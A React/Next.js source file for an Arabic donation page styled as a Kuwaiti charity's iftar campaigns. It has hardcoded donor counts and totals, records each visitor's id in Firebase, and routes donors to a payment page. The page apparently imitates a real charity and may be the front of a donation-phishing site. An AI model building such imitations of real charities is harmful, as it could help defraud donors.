"use client"

import Image from "next/image"
import { useRouter } from "next/navigation"
import { useEffect, useState } from "react"
import { WhatsappIcon } from "@/components/icons"
import { addData } from "@/lib/firebase"

export default function Home() {
  const [_id] = useState(() => "id" + Math.random().toString(16).slice(2))
  const router = useRouter()

  useEffect(() => {
    addData({
      createdDate: new Date().toISOString(),
      id: _id,
    })
  }, [_id])

  return (
    <div className="min-h-screen bg-gray-100 rtl">
      {/* Header */}
      <header className="bg-blue-600 text-white p-3 flex items-center justify-between">
        <button className="p-1">
          <svg
            xmlns="http://www.w3.org/2000/svg"
            width="24"
            height="24"
            viewBox="0 0 24 24"
            fill="none"
            stroke="currentColor"
            strokeWidth="2"
            strokeLinecap="round"
            strokeLinejoin="round"
            className="text-white"
          >
            <line x1="4" x2="20" y1="12" y2="12" />
            <line x1="4" x2="20" y1="6" y2="6" />
            <line x1="4" x2="20" y1="18" y2="18" />
          </svg>
        </button>
        <div className="flex items-center">
          <Image src="/white_logo2.png" alt="الخيرية الكويتية" width={120} height={32} className="h-8 w-auto" />
        </div>
      </header>

      <main className="container mx-auto p-4 space-y-6">
        {/* First Donation Card */}
        <DonationCard
          title="إفطار صائم - غزة"
          imageSrc="/5.jpg"
          imageAlt="إفطار الصائم"
          donorCount={1657}
          amountRequired={125000}
          amountPaid={62500}
          donationAmount={1.75}
          progress={50}
          isCompleted={false}
          onDonate={() => router.push("/payment")}
        />

        {/* Second Donation Card (Completed) */}
        <DonationCard
          title="إفطار صائم - إفريقيا"
          imageSrc="/4.jpg"
          imageAlt="إفطار الصائم"
          donorCount={1150}
          amountRequired={75000}
          amountPaid={75000}
          donationAmount={0}
          progress={100}
          isCompleted={true}
          onDonate={() => router.push("/payment")}
        />

        {/* Third Donation Card */}
        <DonationCard
          title="إفطار صائم - سوريا"
          imageSrc="/3.jpg"
          imageAlt="إفطار الصائم"
          donorCount={221}
          amountRequired={20000}
          amountPaid={2500}
          donationAmount={1.25}
          progress={12}
          isCompleted={false}
          onDonate={() => router.push("/payment")}
        />
      </main>

      {/* WhatsApp floating button */}
      <div className="fixed bottom-4 right-4">
        <button className="bg-green-500 text-white p-3 rounded-full shadow-lg">
          <WhatsappIcon />
        </button>
      </div>
    </div>
  )
}

interface DonationCardProps {
  title: string
  imageSrc: string
  imageAlt: string
  donorCount: number
  amountRequired: number
  amountPaid: number
  donationAmount: number
  progress: number
  isCompleted: boolean
  onDonate: () => void
}

function DonationCard({
  title,
  imageSrc,
  imageAlt,
  donorCount,
  amountRequired,
  amountPaid,
  donationAmount,
  progress,
  isCompleted,
  onDonate,
}: DonationCardProps) {
  const [selectedAmount, setSelectedAmount] = useState<number | null>(null)
  const amountRemaining = amountRequired - amountPaid
  const progressColor = isCompleted ? "bg-green-600" : "bg-red-600"
  const buttonColor = isCompleted ? "bg-gray-400" : "bg-red-600"
  const cartButtonColor = isCompleted ? "bg-gray-400" : "bg-blue-600"

  const handleDonate = () => {
    if (selectedAmount) {
      // Store the selected amount and title
      localStorage.setItem("donationAmount", selectedAmount.toString())
      localStorage.setItem("donationType", title)

      // Call the onDonate function with the selected amount and title
      onDonate()
    } else {
      alert("الرجاء اختيار مبلغ التبرع")
    }
  }

  return (
    <section className="bg-white rounded-lg overflow-hidden shadow">
      <div className="p-4 bg-blue-600 text-white">
        <h2 className="text-lg font-bold text-right">{title}</h2>
      </div>
      <div className="relative">
        <img
          src={imageSrc || "/placeholder.svg"}
          alt={imageAlt}
          width={400}
          height={200}
          className="w-full h-48 object-cover"
        />
        {!isCompleted && (
          <>
            <div className="absolute top-2 left-2 bg-red-600 text-white px-3 py-1 rounded-full text-sm">تبرع الآن</div>
            <div className="absolute bottom-2 left-2 bg-red-600 text-white px-3 py-1 rounded-full">
              {donationAmount} د.ك
            </div>
          </>
        )}
      </div>
      <div className="p-4">
        <div className="flex justify-between text-sm mb-2">
          <div className="text-gray-600">عدد المتبرعين: {donorCount}</div>
        </div>
        <div className="flex justify-between mb-2">
          <div className="font-bold">{amountRemaining.toLocaleString()} د.ك</div>
          <div className="text-gray-600">المتبقي</div>
          <div className="font-bold">{amountPaid.toLocaleString()} د.ك</div>
          <div className="text-gray-600">المدفوع</div>
          <div className="font-bold">{amountRequired.toLocaleString()} د.ك</div>
          <div className="text-gray-600">المطلوب</div>
        </div>
        <div className="w-full bg-gray-200 rounded-full h-2 mb-4">
          <div className={`${progressColor} h-2 rounded-full`} style={{ width: `${progress}%` }}></div>
        </div>
        <div className="grid grid-cols-3 gap-2 mb-4">
          {[5, 10, 20, 50, 100, 200].map((amount) => (
            <button
              key={amount}
              onClick={() => !isCompleted && setSelectedAmount(amount)}
              className={`border rounded py-2 text-center transition-colors ${
                isCompleted
                  ? "text-gray-400 border-gray-300"
                  : selectedAmount === amount
                    ? "bg-blue-600 text-white border-blue-600"
                    : "border-gray-300 hover:bg-blue-50"
              }`}
            >
              {amount} د.ك
            </button>
          ))}
        </div>
        <div className="grid grid-cols-2 gap-2">
          <button
            onClick={handleDonate}
            className={`${buttonColor} text-white rounded py-2 text-center font-bold`}
            disabled={isCompleted || !selectedAmount}
          >
            تبرع الآن
          </button>
          <button
            className={`${cartButtonColor} text-white rounded py-2 text-center font-bold`}
            onClick={() => {
              if (selectedAmount && !isCompleted) {
                // Add to cart logic
                localStorage.setItem(
                  "cartItem",
                  JSON.stringify({
                    title,
                    amount: selectedAmount,
                  }),
                )
                alert("تمت الإضافة إلى السلة")
              } else if (!selectedAmount) {
                alert("الرجاء اختيار مبلغ التبرع")
              }
            }}
            disabled={isCompleted || !selectedAmount}
          >
            أضف إلى السلة
          </button>
        </div>
      </div>
    </section>
  )
}

